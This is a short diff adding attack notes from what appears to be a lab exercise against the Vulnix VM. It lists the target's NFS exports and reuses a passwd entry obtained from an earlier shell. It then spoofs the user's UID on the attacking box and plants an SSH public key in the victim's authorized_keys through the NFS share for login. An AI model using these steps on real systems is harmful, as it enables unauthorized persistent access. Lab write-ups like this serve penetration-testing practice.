@@ -1,0 +1,36 @@
+
+
+# showmount -e 172.16.83.128
+Export list for 172.16.83.128:
+/home/vulnix *
+
+
+#
+# /home/vulnix/ *	# permission denied
+#
+
+#
+# Through 1st shell obtained /etc/passwd
+# vulnix:x:2008:2008::/home/vulnix:/bin/bash
+
+#
+# Created appropriate user on attack box
+# useradd -m -u 2008 vulnix	# access granted
+
+#
+# ssh-keygen
+#
+
+#
+# cat /home/vulnix/.ssh/id_rsa.pub > /tmp/r00t/home/vulnix/.ssh/authorized_keys
+#
+
+#
+# umount /tmp/r00t
+#
+
+#
+# ssh -i /home/vulnix/.ssh/id_rsa vulnix@172.16.83.128
+#
+
+
